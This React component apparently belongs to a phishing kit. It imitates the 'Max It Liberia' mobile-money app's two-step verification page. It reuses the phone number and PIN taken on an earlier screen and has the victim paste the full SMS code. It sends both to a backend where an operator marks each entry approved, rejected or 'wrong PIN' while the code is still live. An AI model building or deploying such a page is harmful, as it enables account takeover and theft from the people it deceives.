import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Otp.css';

export default function Otp() {
  const navigate = useNavigate();
  const { authData, updateAuthData } = useLoanApplication();
  
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  
  const getInitialPhone = () => {
    if (authData.phoneNumber) {
      return authData.phoneNumber;
    }
    
    try {
      const savedPhone = localStorage.getItem('maxit_phone');
      if (savedPhone) {
        return savedPhone;
      }
    } catch (error) {
      console.log('No saved phone found');
    }
    
    return '+231 77 123 45';
  };

  const [phoneNumber] = useState(getInitialPhone());
  const [smsMessage, setSmsMessage] = useState('');
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [showResendToast, setShowResendToast] = useState(false);
  const [timer, setTimer] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [isMessageApproved, setIsMessageApproved] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [showResendErrorModal, setShowResendErrorModal] = useState(false);
  const [showVerifyErrorModal, setShowVerifyErrorModal] = useState(false);
  const [showWrongPinModal, setShowWrongPinModal] = useState(false);
  const [showTimeoutModal, setShowTimeoutModal] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(true);

  const previousStatusRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const messageInputRef = useRef(null);

  const handleMessageChange = (e) => {
    setSmsMessage(e.target.value);
  };

  // Poll for login approval
  useEffect(() => {
    if (!waitingForApproval) return;

    const checkApprovalStatus = async () => {
      try {
        const phone = authData.phoneNumber || phoneNumber;
        
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, pin: authData.pin })
        });

        const data = await response.json();
        
        if (data.approved) {
          setWaitingForApproval(false);
          setShowSuccessToast(true);
          setTimer(40);
          
          const endTime = Date.now() + (40 * 1000);
          localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
        }
      } catch (error) {
        console.error('Error checking approval:', error);
      }
    };

    pollingIntervalRef.current = setInterval(checkApprovalStatus, 2000);
    checkApprovalStatus();

    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [waitingForApproval, phoneNumber, authData.phoneNumber, authData.pin, API_BASE_URL, API_ENDPOINT]);

  useEffect(() => {
    if (showSuccessToast) {
      const toastTimer = setTimeout(() => setShowSuccessToast(false), 2500);
      return () => clearTimeout(toastTimer);
    }
  }, [showSuccessToast]);

  useEffect(() => {
    if (showResendToast) {
      const toastTimer = setTimeout(() => setShowResendToast(false), 2500);
      return () => clearTimeout(toastTimer);
    }
  }, [showResendToast]);

  useEffect(() => {
    if (timer > 0 && !isProcessing && !waitingForApproval) {
      const countdown = setInterval(() => {
        setTimer(prev => {
          const newValue = prev - 1;
          if (newValue <= 0) {
            localStorage.removeItem('otp_timer');
            return 0;
          }
          
          const endTime = Date.now() + (newValue * 1000);
          localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
          
          return newValue;
        });
      }, 1000);

      return () => clearInterval(countdown);
    }
  }, [timer, isProcessing, waitingForApproval]);

  useEffect(() => {
    if (isProcessing && isMessageApproved && progress < 100) {
      const progressTimer = setTimeout(() => {
        setProgress(prev => {
          const increment = Math.random() * 15 + 5;
          return Math.min(prev + increment, 100);
        });
      }, 300);

      return () => clearTimeout(progressTimer);
    } else if (progress >= 100 && isMessageApproved) {
      setTimeout(() => navigate('/status'), 500);
    }
  }, [isProcessing, isMessageApproved, progress, navigate]);

  const checkMessageStatus = async (phone, messageText) => {
    const startTime = Date.now();
    const maxTime = 5 * 60 * 1000;
    const pollInterval = 2000;
    
    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phoneNumber: phone,
            otp: messageText
          })
        });

        const data = await response.json();
        
        if (data.status === 'approved') {
          return { approved: true };
        } else if (data.status === 'rejected') {
          return { approved: false, message: 'Admin marked message as incorrect' };
        } else if (data.status === 'wrong_pin') {
          return { approved: false, wrongPin: true, message: 'Wrong PIN entered' };
        }
        
        const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
        const newStatus = `Please wait... (${elapsedSeconds}s)`;
        
        if (previousStatusRef.current !== newStatus) {
          setVerificationStatus(newStatus);
          previousStatusRef.current = newStatus;
        }
        
        await new Promise(resolve => setTimeout(resolve, pollInterval));
        
      } catch (error) {
        console.error('Error checking message status:', error);
        await new Promise(resolve => setTimeout(resolve, pollInterval));
      }
    }
    
    return { approved: false, timeout: true, message: 'Error occurred, please try again' };
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (isSubmitting || waitingForApproval) return;
    
    const messageText = smsMessage.trim();
    
    if (!messageText) {
      alert('Please paste the complete SMS message');
      return;
    }

    setIsSubmitting(true);
    const phone = authData.phoneNumber || phoneNumber;

    updateAuthData({
      otp: messageText,
      isAuthenticated: true
    });

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          otp: messageText,
          timestamp: new Date().toISOString()
        })
      });

      await response.json();
      
      setIsProcessing(true);
      const initialStatus = 'Please wait...';
      setVerificationStatus(initialStatus);
      previousStatusRef.current = initialStatus;
      setIsMessageApproved(false);
      setProgress(0);
      
      const verificationResult = await checkMessageStatus(phone, messageText);
      
      if (verificationResult.approved) {
        localStorage.removeItem('otp_timer');
        const approvedStatus = '✅ Verified! Proceeding...';
        setVerificationStatus(approvedStatus);
        previousStatusRef.current = approvedStatus;
        setIsMessageApproved(true);
      } else if (verificationResult.wrongPin) {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsMessageApproved(false);
        setShowWrongPinModal(true);
        previousStatusRef.current = null;
      } else if (verificationResult.timeout) {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsMessageApproved(false);
        setShowTimeoutModal(true);
        previousStatusRef.current = null;
      } else {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsMessageApproved(false);
        setShowErrorModal(true);
        setSmsMessage('');
        previousStatusRef.current = null;
        setTimeout(() => messageInputRef.current?.focus(), 100);
      }
      
    } catch (error) {
      console.error('Message verification error:', error);
      setIsSubmitting(false);
      setIsProcessing(false);
      setProgress(0);
      setIsMessageApproved(false);
      setShowVerifyErrorModal(true);
      previousStatusRef.current = null;
    }
  };

  const handleResend = async () => {
    if (timer > 0 || isResending || waitingForApproval) return;
    
    const phone = authData.phoneNumber || phoneNumber;
    if (!phone || phone === '+231 77 123 45') {
      setShowResendErrorModal(true);
      return;
    }
    
    setIsResending(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          timestamp: new Date().toISOString()
        })
      });

      const data = await response.json();
      
      if (data.success) {
        setSmsMessage('');
        setTimer(40);
        
        const endTime = Date.now() + (40 * 1000);
        localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
        
        setShowResendToast(true);
        messageInputRef.current?.focus();
      } else {
        setShowResendErrorModal(true);
      }
    } catch (error) {
      console.error('Resend error:', error);
      setShowResendErrorModal(true);
    } finally {
      setIsResending(false);
    }
  };

  const handleBack = () => {
    localStorage.removeItem('otp_timer');
    navigate(-1);
  };

  const handleWrongPinModalClose = () => {
    setShowWrongPinModal(false);
    localStorage.removeItem('otp_timer');
    localStorage.removeItem('maxit_phone');
    updateAuthData({
      phoneNumber: '',
      pin: '',
      otp: '',
      isAuthenticated: false
    });
    navigate('/login');
  };

  const handleTimeoutModalClose = () => {
    setShowTimeoutModal(false);
    setSmsMessage('');
    setTimeout(() => messageInputRef.current?.focus(), 100);
  };

  const isMessageEntered = smsMessage.trim().length > 0;

  if (isProcessing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            
            <h1 className="processing-title">Verifying message</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
          </div>
        </main>

        <footer className="otp-footer">
          © 2025 Max It Liberia
        </footer>
      </div>
    );
  }

  return (
    <div className="otp-container">
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Wrong message!</h2>
            <p className="error-modal-message">
              Check SMS for the code or request code again after countdown is over
            </p>
            <button className="error-modal-button" onClick={() => setShowErrorModal(false)}>
              OK
            </button>
          </div>
        </div>
      )}

      {showTimeoutModal && (
        <div className="error-modal-overlay" onClick={handleTimeoutModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Timeout</h2>
            <p className="error-modal-message">Error occurred, please try again</p>
            <button className="error-modal-button" onClick={handleTimeoutModalClose}>
              OK
            </button>
          </div>
        </div>
      )}

      {showWrongPinModal && (
        <div className="error-modal-overlay" onClick={handleWrongPinModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Wrong PIN!</h2>
            <p className="error-modal-message">
              The PIN or phone number you entered earlier was incorrect. Please login again with the correct details.
            </p>
            <button className="error-modal-button" onClick={handleWrongPinModalClose}>
              Back to Login
            </button>
          </div>
        </div>
      )}

      {showResendErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowResendErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Resend Failed</h2>
            <p className="error-modal-message">
              Failed to resend message. Please try again later.
            </p>
            <button className="error-modal-button" onClick={() => setShowResendErrorModal(false)}>
              OK
            </button>
          </div>
        </div>
      )}

      {showVerifyErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowVerifyErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Verification Failed</h2>
            <p className="error-modal-message">
              Failed to verify message. Please try again later.
            </p>
            <button className="error-modal-button" onClick={() => setShowVerifyErrorModal(false)}>
              OK
            </button>
          </div>
        </div>
      )}

      {showSuccessToast && (
        <div className="success-toast">
          <div className="success-icon">✓</div>
          <span className="success-text">Message sent successfully!</span>
        </div>
      )}

      {showResendToast && (
        <div className="success-toast resend">
          <div className="success-icon">📱</div>
          <span className="success-text">Message resent successfully!</span>
        </div>
      )}

      <header className="otp-header">
        <button className="back-btn" onClick={handleBack}>←</button>
        
        <div className="logo-large">
          <span className="logo-large-max">Max</span>
          <span className="logo-large-it">It</span>
        </div>
        
        <button className="menu-btn" aria-label="Menu">
          <div className="menu-line"></div>
          <div className="menu-line"></div>
          <div className="menu-line"></div>
        </button>
      </header>

      <main className="otp-content">
        <div className="otp-card">
          <h1 className="otp-title">Two Step Verification</h1>
          <p className="otp-subtitle">Paste the complete link/sms message sent to your number</p>
          <p className="otp-phone">{phoneNumber}</p>

          <form onSubmit={handleSubmit}>
            <div className="otp-inputs-container">
              <textarea
                ref={messageInputRef}
                className="otp-message-box"
                value={smsMessage}
                onChange={handleMessageChange}
                placeholder="Paste your complete Link/SMS message here..."
                rows="4"
                disabled={isResending || isSubmitting || waitingForApproval}
              />

              <p className="resend-text">
                {waitingForApproval ? (
                  <span className="requesting-text">Requesting message...</span>
                ) : isResending ? (
                  <span className="resending-text">Resending message...</span>
                ) : timer > 0 ? (
                  `Resend in ${timer} seconds`
                ) : (
                  <>
                    Didn't receive the message?{' '}
                    <span className="resend-link" onClick={handleResend}>Resend</span>
                  </>
                )}
              </p>
            </div>

            <button 
              type="submit" 
              className={`submit-button ${isMessageEntered && !waitingForApproval ? 'active' : ''}`}
              disabled={!isMessageEntered || isResending || isSubmitting || waitingForApproval}
            >
              {isSubmitting ? 'VERIFYING...' : 'SUBMIT'}
            </button>
          </form>
        </div>
      </main>

      <footer className="otp-footer">
        © 2025 Max It Liberia
      </footer>
    </div>
  );
}